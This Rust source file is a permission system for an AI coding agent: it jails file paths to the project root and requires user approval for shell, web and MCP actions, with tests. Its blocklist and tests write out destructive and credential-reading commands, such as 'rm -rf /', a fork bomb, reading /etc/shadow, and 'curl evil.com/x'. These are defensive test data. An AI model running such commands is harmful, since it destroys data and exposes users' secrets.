//! Permission system for tool execution.
//!
//! Controls what the agent is allowed to do. Every destructive or sensitive
//! action requires user approval. Permissions can be pre-approved in config
//! or prompted interactively.
//!
//! Security boundaries:
//! - File access: jailed to project root (no path traversal)
//! - Shell commands: require user approval (with allow-list for safe commands)
//! - Web access: requires user approval on first use per session
//! - MCP tools: require user approval per server on first use

use parking_lot::Mutex;
use std::collections::HashSet;
use std::io::{self, Write};
use std::path::{Component, PathBuf};

use crate::config::Config;
use crate::tui::event::AppEvent;
use tokio::sync::mpsc;

/// Permission decisions cached for the current session.
pub struct PermissionManager {
    /// Project root (canonical path for jail enforcement)
    project_root: PathBuf,
    /// Shell commands approved this session (prefix match)
    approved_shell: Mutex<HashSet<String>>,
    /// MCP servers approved this session
    approved_mcp: Mutex<HashSet<String>>,
    /// Whether web access has been approved this session
    web_approved: Mutex<bool>,
    /// Pre-approved shell command prefixes from config
    shell_allowlist: Vec<String>,
    /// Whether to auto-approve all actions (--yes flag, dangerous)
    auto_approve: bool,
    /// Optional REPL UI event channel for permission requests.
    prompt_events: Mutex<Option<mpsc::UnboundedSender<AppEvent>>>,
}

/// Actions that require permission.
#[derive(Debug, Clone)]
pub enum Action {
    /// Read a file (path is resolved and jail-checked)
    ReadFile(String),
    /// Write/edit a file
    WriteFile(String),
    /// Execute a shell command
    Shell(String),
    /// Web search (carries the query so user can see what's being sent)
    WebSearch(String),
    /// Fetch a URL (carries the URL so user can see where data goes)
    WebFetch(String),
    /// Call an MCP tool
    McpUse(String, String), // (server, tool)
}

impl PermissionManager {
    pub fn new(config: &Config) -> Self {
        Self::with_auto_approve(config, false)
    }

    pub fn headless(config: &Config) -> Self {
        Self::with_auto_approve(config, true)
    }

    fn with_auto_approve(config: &Config, auto_approve: bool) -> Self {
        let project_root = config
            .project_root
            .canonicalize()
            .unwrap_or_else(|_| config.project_root.clone());

        // Default safe shell prefixes
        let shell_allowlist = vec![
            "cargo".into(),
            "go ".into(),
            "npm ".into(),
            "pnpm ".into(),
            "yarn ".into(),
            "python".into(),
            "pip ".into(),
            "pytest".into(),
            "node ".into(),
            "npx ".into(),
            "git status".into(),
            "git diff".into(),
            "git log".into(),
            "git branch".into(),
            "ls".into(),
            "cat ".into(),
            "head ".into(),
            "tail ".into(),
            "wc ".into(),
            "find ".into(),
            "grep ".into(),
            "rg ".into(),
            "echo ".into(),
            "which ".into(),
            "pwd".into(),
            "env".into(),
            "make".into(),
        ];

        Self {
            project_root,
            approved_shell: Mutex::new(HashSet::new()),
            approved_mcp: Mutex::new(HashSet::new()),
            web_approved: Mutex::new(false),
            shell_allowlist,
            auto_approve,
            prompt_events: Mutex::new(None),
        }
    }

    pub fn set_prompt_event_tx(&self, tx: mpsc::UnboundedSender<AppEvent>) {
        *self.prompt_events.lock() = Some(tx);
    }

    /// Resolve a file path and verify it's within the project root.
    /// Returns the canonical path or an error if it escapes the jail.
    pub fn resolve_and_check_path(&self, path_str: &str) -> Result<PathBuf, String> {
        // Reject absolute paths
        if path_str.starts_with('/') || path_str.starts_with('\\') {
            return Err(format!(
                "Absolute paths not allowed: {path_str}. Use paths relative to the project root: {}",
                self.project_root.display()
            ));
        }

        let joined = self.project_root.join(path_str);

        // Fast path: if the path has no `..` components, it cannot escape
        // the jail via directory traversal. But a symlink inside the tree
        // CAN point outside — catch that by canonicalizing symlinks and
        // verifying the target stays within the jail.
        //
        // Exception: `.miniswe/` may legitimately be a symlink to an
        // external directory (e.g. docker's `.miniswe/ → /output`), so
        // paths under it are allowed to escape.
        let has_parent_dir = std::path::Path::new(path_str)
            .components()
            .any(|c| matches!(c, Component::ParentDir));
        if !has_parent_dir {
            if joined.is_symlink()
                && !path_str.starts_with(".miniswe/")
                && !path_str.starts_with(".miniswe\\")
                && let Ok(canonical) = joined.canonicalize()
                && !canonical.starts_with(&self.project_root)
            {
                return Err(format!(
                    "Symlink escapes project root: {path_str} → {}",
                    canonical.display()
                ));
            }
            return Ok(joined);
        }

        // Canonicalize to resolve ../
        // For new files that don't exist yet, canonicalize the parent
        let canonical = if joined.exists() {
            joined
                .canonicalize()
                .map_err(|e| format!("Cannot resolve path: {e}"))?
        } else {
            let parent = joined.parent().ok_or_else(|| "Invalid path".to_string())?;
            if !parent.exists() {
                // Parent doesn't exist — will be created, check grandparent
                let mut check = parent.to_path_buf();
                while !check.exists() {
                    check = check
                        .parent()
                        .ok_or_else(|| "Invalid path".to_string())?
                        .to_path_buf();
                }
                let canonical_parent = check
                    .canonicalize()
                    .map_err(|e| format!("Cannot resolve path: {e}"))?;
                if !canonical_parent.starts_with(&self.project_root) {
                    return Err(format!(
                        "Path escapes project root: {path_str}. Project root is: {}",
                        self.project_root.display()
                    ));
                }
                return Ok(joined);
            }
            let canonical_parent = parent
                .canonicalize()
                .map_err(|e| format!("Cannot resolve path: {e}"))?;
            canonical_parent.join(joined.file_name().unwrap_or_default())
        };

        if !canonical.starts_with(&self.project_root) {
            return Err(format!("Path escapes project root: {path_str}"));
        }

        Ok(canonical)
    }

    /// Check if an action needs a user prompt. Returns:
    /// - `Ok(None)` — allowed, no prompt needed
    /// - `Ok(Some(prompt))` — needs user approval, here's the prompt text
    /// - `Err(reason)` — blocked (blocklist), no prompt will help
    pub fn check_needs_prompt(&self, action: &Action) -> Result<Option<String>, String> {
        if self.auto_approve {
            return Ok(None);
        }
        match action {
            Action::ReadFile(_) | Action::WriteFile(_) => Ok(None),
            Action::Shell(cmd) => self.check_shell_needs_prompt(cmd),
            Action::WebSearch(query) => self.check_web_needs_prompt(&format!(
                "Allow web search?\n  query: \"{query}\"\n  [y]es / [n]o / [a]llow all web: "
            )),
            Action::WebFetch(url) => self.check_web_needs_prompt(&format!(
                "Allow web fetch?\n  url: {url}\n  [y]es / [n]o / [a]llow all web: "
            )),
            Action::McpUse(server, tool) => self.check_mcp_needs_prompt(server, tool),
        }
    }

    /// Record user's approval for an action after prompting.
    pub fn approve(&self, action: &Action, always: bool) {
        match action {
            Action::Shell(cmd) => {
                if always {
                    self.approved_shell.lock().insert(cmd.trim().to_string());
                }
            }
            Action::WebSearch(_) | Action::WebFetch(_) => {
                if always {
                    *self.web_approved.lock() = true;
                }
            }
            Action::McpUse(server, _) => {
                if always {
                    self.approved_mcp.lock().insert(server.clone());
                }
            }
            _ => {}
        }
    }

    fn check_shell_needs_prompt(&self, cmd: &str) -> Result<Option<String>, String> {
        let cmd_trimmed = cmd.trim();
        for blocked in BLOCKED_COMMANDS {
            if cmd_trimmed.contains(blocked) {
                return Err(format!("Blocked dangerous command: {cmd_trimmed}"));
            }
        }
        // Commands with shell metacharacters (pipes, chains, redirects)
        // skip the allowlist — auto-approval only covers simple commands.
        if !contains_shell_metachar(cmd_trimmed) {
            for prefix in &self.shell_allowlist {
                if cmd_trimmed.starts_with(prefix) {
                    return Ok(None);
                }
            }
        }
        {
            let approved = self.approved_shell.lock();
            if approved.contains(cmd_trimmed) {
                return Ok(None);
            }
        }
        Ok(Some(format!(
            "Allow shell command?\n  $ {cmd_trimmed}\n  [y]es / [n]o / [a]lways for this command: "
        )))
    }

    fn check_web_needs_prompt(&self, prompt: &str) -> Result<Option<String>, String> {
        {
            let approved = self.web_approved.lock();
            if *approved {
                return Ok(None);
            }
        }
        Ok(Some(prompt.to_string()))
    }

    fn check_mcp_needs_prompt(&self, server: &str, tool: &str) -> Result<Option<String>, String> {
        {
            let approved = self.approved_mcp.lock();
            if approved.contains(server) {
                return Ok(None);
            }
        }
        Ok(Some(format!(
            "Allow MCP '{server}' tool '{tool}'?\n  [y]es / [n]o / [a]lways for this server: "
        )))
    }

    /// Check if an action is allowed. Prompts the user if needed (non-TUI mode).
    /// Returns Ok(()) if approved, Err(reason) if denied.
    pub fn check(&self, action: &Action) -> Result<(), String> {
        if self.auto_approve {
            return Ok(());
        }

        match action {
            Action::ReadFile(_) | Action::WriteFile(_) => {
                // File access is jail-checked at resolve time, always allowed within jail
                Ok(())
            }
            Action::Shell(cmd) => self.check_shell(cmd),
            Action::WebSearch(query) => self.check_web_search(query),
            Action::WebFetch(url) => self.check_web_fetch(url),
            Action::McpUse(server, tool) => self.check_mcp(server, tool),
        }
    }

    /// Check if a shell command is allowed.
    fn check_shell(&self, cmd: &str) -> Result<(), String> {
        let cmd_trimmed = cmd.trim();

        // Check blocklist (dangerous commands)
        for blocked in BLOCKED_COMMANDS {
            if cmd_trimmed.contains(blocked) {
                return Err(format!("Blocked dangerous command: {cmd_trimmed}"));
            }
        }

        // Commands with shell metacharacters (pipes, chains, redirects)
        // skip the allowlist — auto-approval only covers simple commands.
        if !contains_shell_metachar(cmd_trimmed) {
            for prefix in &self.shell_allowlist {
                if cmd_trimmed.starts_with(prefix) {
                    return Ok(());
                }
            }
        }

        // Check session approvals
        {
            let approved = self.approved_shell.lock();
            if approved.contains(cmd_trimmed) {
                return Ok(());
            }
        }

        // Prompt user
        let approved = self.request_user_decision(&format!(
            "Allow shell command?\n  $ {cmd_trimmed}\n  [y]es / [n]o / [a]lways for this command: "
        ));

        match approved.as_str() {
            "y" | "yes" => Ok(()),
            "a" | "always" => {
                self.approved_shell.lock().insert(cmd_trimmed.to_string());
                Ok(())
            }
            _ => Err("Shell command denied by user".into()),
        }
    }

    /// Check if a web search is allowed. Shows the query to the user.
    fn check_web_search(&self, query: &str) -> Result<(), String> {
        // If blanket web access was approved, allow
        {
            let approved = self.web_approved.lock();
            if *approved {
                return Ok(());
            }
        }

        let response = self.request_user_decision(&format!(
            "Allow web search?\n\
             \x1b[2m  query: \"{query}\"\n\
             \x1b[2m  sends to: web search API\x1b[0m\n\
             \x1b[1;33m  [y]es / [n]o / [a]llow all web this session: \x1b[0m"
        ));

        match response.as_str() {
            "y" | "yes" => Ok(()),
            "a" | "always" | "allow" => {
                *self.web_approved.lock() = true;
                Ok(())
            }
            _ => Err("Web search denied by user".into()),
        }
    }

    /// Check if a URL fetch is allowed. Shows the URL to the user.
    fn check_web_fetch(&self, url: &str) -> Result<(), String> {
        // If blanket web access was approved, allow
        {
            let approved = self.web_approved.lock();
            if *approved {
                return Ok(());
            }
        }

        let via = if url.contains("r.jina.ai") || !url.starts_with("http") {
            "Jina Reader API (content proxied through r.jina.ai)"
        } else {
            "direct HTTP request"
        };

        let response = self.request_user_decision(&format!(
            "Allow web fetch?\n\
             \x1b[2m  url: {url}\n\
             \x1b[2m  via: {via}\x1b[0m\n\
             \x1b[1;33m  [y]es / [n]o / [a]llow all web this session: \x1b[0m"
        ));

        match response.as_str() {
            "y" | "yes" => Ok(()),
            "a" | "always" | "allow" => {
                *self.web_approved.lock() = true;
                Ok(())
            }
            _ => Err("Web fetch denied by user".into()),
        }
    }

    /// Check if an MCP tool call is allowed.
    fn check_mcp(&self, server: &str, tool: &str) -> Result<(), String> {
        {
            let approved = self.approved_mcp.lock();
            if approved.contains(server) {
                return Ok(());
            }
        }

        let response = self.request_user_decision(&format!(
            "Allow MCP server '{server}' to run tool '{tool}'?\n  [y]es / [n]o / [a]lways for this server: "
        ));

        match response.as_str() {
            "y" | "yes" => Ok(()),
            "a" | "always" => {
                self.approved_mcp.lock().insert(server.to_string());
                Ok(())
            }
            _ => Err(format!("MCP tool '{server}/{tool}' denied by user")),
        }
    }

    /// Prompt the user with a free-form yes/no message. Intended for "soft"
    /// rejections — situations where a check would otherwise bail but the user
    /// should be able to override in interactive mode. In headless / auto-approve
    /// mode this returns `false` without prompting, so callers fall back to the
    /// rejection path.
    pub fn confirm(&self, prompt: &str) -> bool {
        if self.auto_approve {
            return false;
        }
        let response = self.request_user_decision(prompt);
        matches!(response.as_str(), "y" | "yes")
    }

    fn request_user_decision(&self, prompt: &str) -> String {
        if let Some(tx) = self.prompt_events.lock().clone() {
            let (response_tx, response_rx) = std::sync::mpsc::channel();
            if tx
                .send(AppEvent::PermissionRequest(prompt.to_string(), response_tx))
                .is_ok()
            {
                return response_rx.recv().unwrap_or_else(|_| "n".into());
            }
            // TUI mode but the event channel is broken (receiver
            // dropped). Deny rather than falling through to
            // prompt_user(), which would corrupt the terminal by
            // disabling raw mode and reading stdin directly.
            return "n".into();
        }
        // Non-TUI mode (run.rs single-shot path) — prompt on stdin.
        prompt_user(prompt)
    }
}

/// Commands that are always blocked.
const BLOCKED_COMMANDS: &[&str] = &[
    "rm -rf /",
    "rm -rf ~",
    "rm -rf $HOME",
    "mkfs",
    "dd if=",
    ":(){:|:&};:",
    "chmod -R 777 /",
    "wget http", // downloading arbitrary executables
    "curl | sh",
    "curl | bash",
];

/// Shell metacharacters that allow chaining or redirecting commands.
/// If any of these appear in a command, the allowlist is bypassed and the
/// user is always prompted — even if the first word matches a safe prefix
/// like `cargo`. Without this, `cargo --version; cat ~/.ssh/id_rsa` would
/// auto-approve through the `cargo` prefix and run both commands via
/// `sh -c`.
const SHELL_METACHARS: &[&str] = &[";", "&&", "||", "|", "`", "$(", ">>", ">", "<"];

fn contains_shell_metachar(cmd: &str) -> bool {
    SHELL_METACHARS.iter().any(|m| cmd.contains(m))
}

/// Prompt the user for a decision.
///
/// Temporarily disables terminal raw mode (which reedline enables)
/// so that stdin reads work correctly for permission prompts.
fn prompt_user(message: &str) -> String {
    // Ensure terminal is in cooked mode for line input
    let _ = crossterm::terminal::disable_raw_mode();

    eprint!("\x1b[1;33m{message}\x1b[0m");
    io::stderr().flush().ok();

    let mut input = String::new();

    // Don't re-enable raw mode — reedline will do that on next read_line()
    match io::stdin().read_line(&mut input) {
        Ok(_) => input.trim().to_lowercase(),
        Err(_) => "n".into(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::sync::mpsc;

    #[tokio::test]
    async fn permission_checks_can_request_ui_decision_over_event_channel() {
        let config = Config::default();
        let perms = std::sync::Arc::new(PermissionManager::new(&config));
        let (tx, mut rx) = mpsc::unbounded_channel();
        perms.set_prompt_event_tx(tx);

        let perms_for_thread = perms.clone();
        let handle = std::thread::spawn(move || {
            perms_for_thread.check(&Action::WebSearch("golang static file server".into()))
        });

        let event = rx.recv().await.expect("permission request event");
        match event {
            AppEvent::PermissionRequest(prompt, response_tx) => {
                assert!(prompt.contains("Allow web search?"));
                response_tx.send("y".into()).unwrap();
            }
            other => panic!("unexpected event: {other:?}"),
        }

        assert!(handle.join().unwrap().is_ok());
    }

    #[test]
    fn simple_allowlisted_command_auto_approves() {
        let config = Config::default();
        let perms = PermissionManager::headless(&config);
        // "cargo build" matches the "cargo" prefix — no prompt needed.
        assert!(
            perms
                .check_shell_needs_prompt("cargo build")
                .unwrap()
                .is_none(),
            "simple cargo command should auto-approve"
        );
    }

    #[test]
    fn semicolon_chain_bypasses_allowlist() {
        let config = Config::default();
        let perms = PermissionManager::headless(&config);
        // "cargo --version; cat /etc/passwd" starts with "cargo" but
        // contains ";", so the allowlist must NOT auto-approve.
        assert!(
            perms
                .check_shell_needs_prompt("cargo --version; cat /etc/passwd")
                .unwrap()
                .is_some(),
            "semicolon-chained command must require prompt"
        );
    }

    #[test]
    fn pipe_chain_bypasses_allowlist() {
        let config = Config::default();
        let perms = PermissionManager::headless(&config);
        assert!(
            perms
                .check_shell_needs_prompt("git status | xargs rm")
                .unwrap()
                .is_some(),
            "pipe-chained command must require prompt"
        );
    }

    #[test]
    fn and_chain_bypasses_allowlist() {
        let config = Config::default();
        let perms = PermissionManager::headless(&config);
        assert!(
            perms
                .check_shell_needs_prompt("git diff && curl evil.com/x")
                .unwrap()
                .is_some(),
            "&&-chained command must require prompt"
        );
    }

    #[test]
    fn subshell_bypasses_allowlist() {
        let config = Config::default();
        let perms = PermissionManager::headless(&config);
        assert!(
            perms
                .check_shell_needs_prompt("echo $(cat /etc/shadow)")
                .unwrap()
                .is_some(),
            "subshell command must require prompt"
        );
    }

    #[test]
    fn redirect_bypasses_allowlist() {
        let config = Config::default();
        let perms = PermissionManager::headless(&config);
        assert!(
            perms
                .check_shell_needs_prompt("echo secret > /tmp/leak.txt")
                .unwrap()
                .is_some(),
            "redirect command must require prompt"
        );
    }

    #[test]
    fn blocklist_still_hard_blocks_with_metachars() {
        let config = Config::default();
        let perms = PermissionManager::headless(&config);
        // The blocklist fires before the metachar check.
        assert!(
            perms.check_shell_needs_prompt("rm -rf /").is_err(),
            "blocklisted command must be hard-blocked"
        );
    }

    #[test]
    fn regular_file_path_allowed() {
        let tmp = tempfile::tempdir().unwrap();
        let mut config = Config::default();
        config.project_root = tmp.path().to_path_buf();
        let perms = PermissionManager::new(&config);

        std::fs::write(tmp.path().join("hello.rs"), "fn main() {}").unwrap();
        assert!(perms.resolve_and_check_path("hello.rs").is_ok());
    }

    #[cfg(unix)]
    #[test]
    fn symlink_escaping_jail_is_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        let mut config = Config::default();
        config.project_root = tmp.path().canonicalize().unwrap();
        let perms = PermissionManager::new(&config);

        // Create a symlink that points outside the project root
        std::os::unix::fs::symlink("/etc/hostname", tmp.path().join("evil.txt")).unwrap();
        let result = perms.resolve_and_check_path("evil.txt");
        assert!(result.is_err(), "symlink to /etc/hostname must be rejected");
        assert!(
            result.unwrap_err().contains("Symlink escapes"),
            "error should mention symlink escape"
        );
    }

    #[cfg(unix)]
    #[test]
    fn symlink_within_jail_is_allowed() {
        let tmp = tempfile::tempdir().unwrap();
        let mut config = Config::default();
        config.project_root = tmp.path().canonicalize().unwrap();
        let perms = PermissionManager::new(&config);

        // Create a symlink to a file inside the project root
        std::fs::write(tmp.path().join("real.rs"), "fn main() {}").unwrap();
        std::os::unix::fs::symlink(tmp.path().join("real.rs"), tmp.path().join("link.rs")).unwrap();
        assert!(
            perms.resolve_and_check_path("link.rs").is_ok(),
            "symlink within jail should be allowed"
        );
    }

    #[cfg(unix)]
    #[test]
    fn miniswe_symlink_allowed_to_escape() {
        let tmp = tempfile::tempdir().unwrap();
        let mut config = Config::default();
        config.project_root = tmp.path().canonicalize().unwrap();
        let perms = PermissionManager::new(&config);

        // .miniswe/ → external dir is the docker use case
        let external = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(external.path(), tmp.path().join(".miniswe")).unwrap();
        std::fs::write(external.path().join("config.toml"), "").unwrap();
        assert!(
            perms.resolve_and_check_path(".miniswe/config.toml").is_ok(),
            ".miniswe symlink should be allowed to escape"
        );
    }

    #[test]
    fn broken_tui_channel_denies_instead_of_falling_to_stdin() {
        let config = Config::default();
        let perms = PermissionManager::new(&config);

        // Set up a TUI event channel, then drop the receiver so the
        // channel is broken. This simulates "TUI mode, but something
        // went wrong."
        let (tx, _rx) = mpsc::unbounded_channel();
        perms.set_prompt_event_tx(tx);
        drop(_rx); // receiver gone — send will fail

        // A shell command that isn't on the allowlist and has no
        // metachars, so it would normally prompt.
        let result = perms.check(&Action::Shell("dangerous-command".into()));

        // Should be denied (not hang on stdin, not panic, not corrupt
        // the terminal).
        assert!(
            result.is_err(),
            "broken TUI channel should deny, got: {result:?}"
        );
    }
}
